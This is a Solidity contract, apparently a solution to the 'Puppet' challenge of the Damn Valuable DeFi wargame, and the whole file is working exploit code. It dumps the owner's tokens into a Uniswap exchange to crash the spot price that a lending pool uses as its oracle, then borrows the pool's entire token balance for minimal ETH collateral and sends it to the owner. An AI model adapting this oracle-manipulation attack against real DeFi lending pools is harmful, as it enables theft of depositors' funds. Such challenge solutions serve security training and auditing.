// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import "../../puppet/PuppetPool.sol";
import "./UniswapExchangeInterface.sol";

contract PuppetAttacker {
    DamnValuableToken private dvt;
    PuppetPool private pool;
    UniswapExchangeInterface private exchange;

    address private immutable owner;

    constructor(address _dvt, address _pool, address _exchange) {
        dvt = DamnValuableToken(_dvt);
        pool = PuppetPool(_pool);
        exchange = UniswapExchangeInterface(_exchange);

        owner = msg.sender;
    }

    function exploit() external payable {
        require(msg.sender == owner, "nope");

        uint256 initialTokens = dvt.balanceOf(owner) - 1 ether; 
        dvt.transferFrom(owner, address(this), initialTokens);

        dvt.approve(address(exchange), initialTokens);
        exchange.tokenToEthSwapInput(
            initialTokens,
            9 ether,
            block.timestamp
        );

        uint256 amountToBorrow = dvt.balanceOf(address(pool));
        uint256 requiredEth = pool.calculateDepositRequired(amountToBorrow);
        require(address(this).balance >= requiredEth, "oof");

        pool.borrow{value: requiredEth}(amountToBorrow);
        dvt.transfer(owner, dvt.balanceOf(address(this)));
    }

    fallback() external payable {}
}